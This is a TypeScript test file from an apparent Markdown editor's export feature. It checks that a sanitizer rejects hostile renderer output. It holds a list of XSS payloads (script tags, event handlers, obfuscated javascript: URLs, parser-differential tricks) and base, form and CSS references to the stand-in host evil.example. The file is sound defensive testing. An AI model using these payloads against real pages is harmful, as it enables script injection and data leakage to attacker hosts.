// @vitest-environment jsdom
// APPSEC-R2-12 (AC-B12.8, AC-B12.11): o corpo adversarial da AppSec r2 (17 saídas hostis de
// renderizador + 2 diferenças de parser + CSS que busca recurso externo) passa pelo normalizador da
// exportação, que relê a saída com o parser do navegador e só devolve a serialização conferida.
import {
  exportDocument,
  renderExportBody,
  type ExportRenderers,
  type ExportSegment,
} from '@simplemd/core';
import { describe, expect, test } from 'vitest';
import { normalizeRender, normalizeRenderers } from '../src/export/normalize';

const parse = (html: string) => new DOMParser().parseFromString(html, 'text/html');

/** Construções vivas no documento exportado JÁ PARSEADO (texto que só as menciona não conta). */
function liveConstructs(html: string): string[] {
  const hits: string[] = [];
  for (const el of parse(html).querySelectorAll('*')) {
    const tag = el.tagName.toLowerCase();
    if (
      [
        'script',
        'iframe',
        'object',
        'embed',
        'base',
        'form',
        'frame',
        'foreignobject',
        'link',
      ].includes(tag)
    )
      hits.push(`<${tag}>`);
    // A única meta com http-equiv permitida é a CSP do próprio exportador (APPSEC-R2-09).
    if (
      tag === 'meta' &&
      el.getAttribute('http-equiv') &&
      el.getAttribute('http-equiv') !== 'Content-Security-Policy'
    )
      hits.push('<meta http-equiv>');
    for (const attr of el.attributes) {
      const v = [...attr.value]
        .filter((char) => char.charCodeAt(0) > 32)
        .join('')
        .toLowerCase();
      if (attr.name.toLowerCase().startsWith('on')) hits.push(`${tag}[${attr.name}]`);
      if (/^(javascript|vbscript|livescript):|^data:text\/html/.test(v))
        hits.push(`${tag}[${attr.name}=${attr.value}]`);
    }
  }
  return hits;
}

const markdown = [
  '---',
  'lang: \'pt" onload="alert(1)\'',
  'title: x',
  '---',
  '# T</title><script>alert(1)</script>',
  '',
  '<script>alert(1)</script>',
  '',
  '<img src=x onerror=alert(1)>',
  '',
  'inline <svg onload=alert(1)> and <a href="javascript:alert(1)">a</a>',
  '',
  '[l1](javascript:alert(1)) [l2](JaVaScRiPt:alert(1)) [l3](java\tscript:alert(1)) [l4](java&#115;cript:alert(1))',
  '[l5](<javascript:alert(1)>) [l6](data:text/html,<script>alert(1)</script>) [l7](vbscript:x) [l8][r]',
  '',
  '![i1](javascript:alert(1)) ![i2](data:image/svg+xml,<svg onload=alert(1)>) ![i3](" onerror="alert(1))',
  '',
  '<javascript:alert(1)>',
  '',
  '[r]: javascript:alert(1)',
  '',
  '```mermaid',
  'graph TD; A-->B',
  '```',
  '',
  '$$',
  'x',
  '$$',
  '',
].join('\n');

/** As 17 saídas hostis da AppSec r2 (`qa/AppSecR2/export-adversarial`). */
const evilOutputs = [
  '<svg onload="alert(1)"></svg>',
  '<svg/onload=alert(1)>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<svg><a href="java&#115;cript:alert(1)">x</a></svg>',
  '<svg><a href="java&#x09;script:alert(1)">x</a></svg>',
  '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>',
  '<svg><foreignObject><div>x</div></foreignObject></svg>',
  '<svg><use href="data:image/svg+xml,&lt;svg onload=alert(1)&gt;"/></svg>',
  '<math><mi href="javascript:alert(1)">x</mi></math>',
  '<img src="x" onerror="alert(1)">',
  '<IMG SRC=x OnError=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><SCRIPT >alert(1)</SCRIPT></svg>',
  '<iframe srcdoc="x"></iframe>',
  '<base href="https://evil.example/">',
  '<form action="https://evil.example/"><button>x</button></form>',
  '<a href="&#106;avascript:alert(1)">x</a>',
];

/** Diferenças de parser (o leitor de texto aceitava) e CSS que busca recurso externo. */
const differentials = [
  '<svg x=a"b onload=alert(1)>',
  '<!--<a x="--><img src=x onerror=alert(1)>">',
  '<svg><style>@import url(https://evil.example/x.css)</style></svg>',
  '<svg><rect style="fill:url(https://evil.example/p)"/></svg>',
  '<svg><rect fill="url(https://evil.example/p)"/></svg>',
];

describe('APPSEC-R2-12 — normalizador da saída dos renderizadores', () => {
  test.each(evilOutputs)('saída hostil recusada: %s', (html) => {
    expect(normalizeRender(html)).toBeNull();
  });

  test.each(differentials)('diferença de parser / CSS externo recusado: %s', (html) => {
    expect(normalizeRender(html)).toBeNull();
  });

  test('saída legítima passa e sai com o mesmo DOM', () => {
    for (const html of [
      '<svg viewBox="0 0 10 10"><g><text x="1">A</text></g></svg>',
      '<span class="katex"><span class="mord">x</span></span>',
      '<svg id="m1"><marker id="m1_end"><path d="M 0 0 L 10 5 z"></path></marker><path d="M0,0L10,10" marker-end="url(#m1_end)"></path></svg>',
    ]) {
      const out = normalizeRender(html);
      expect(out, html).not.toBeNull();
      expect(parse(out!).body.innerHTML).toBe(parse(html).body.innerHTML);
    }
  });

  test('AC-B12.11: <title> e <desc> do SVG (pizza acessível, B-15) ficam', () => {
    const pie =
      '<svg role="img" aria-labelledby="t d"><title id="t">Pets</title><desc id="d">Cães 60%, gatos 40%</desc><g><path d="M0,0L1,1" fill="#336"></path></g></svg>';
    const svg = parse(normalizeRender(pie)!).querySelector('svg');
    expect(svg?.querySelector(':scope > title')?.textContent).toBe('Pets');
    expect(svg?.querySelector(':scope > desc')?.textContent).toBe('Cães 60%, gatos 40%');
  });

  for (const mode of ['file', 'print'] as const) {
    test(`pipeline (${mode}) com documento e renderizadores hostis → 0 construções vivas`, async () => {
      const outputs = [...evilOutputs, ...differentials];
      let i = 0;
      const hostile: ExportRenderers = {
        fence: async () => ({ html: outputs[i++ % outputs.length]! }),
        block: async (text) =>
          text.startsWith('$$')
            ? { html: '<svg/onload=alert(1)>', end: text.indexOf('$$', 2) + 2 }
            : null,
        inline: (text, blocked): ExportSegment[] =>
          text.length > 4 && blocked.length === 0
            ? [{ from: 0, to: 1, html: '<img src=x onerror=alert(1)>', math: true }]
            : [],
      };
      const { bodyHtml } = await renderExportBody(markdown, {
        renderers: normalizeRenderers(hostile),
        mode,
        images: { notePath: null, map: new Map() },
      });
      const doc = exportDocument({
        title: 'T</title><script>alert(1)</script>',
        lang: 'pt-BR',
        css: 'a{}',
        bodyHtml,
      });
      expect(liveConstructs(doc)).toEqual([]);
      expect(doc).not.toMatch(/evil\.example/);
    });
  }
});
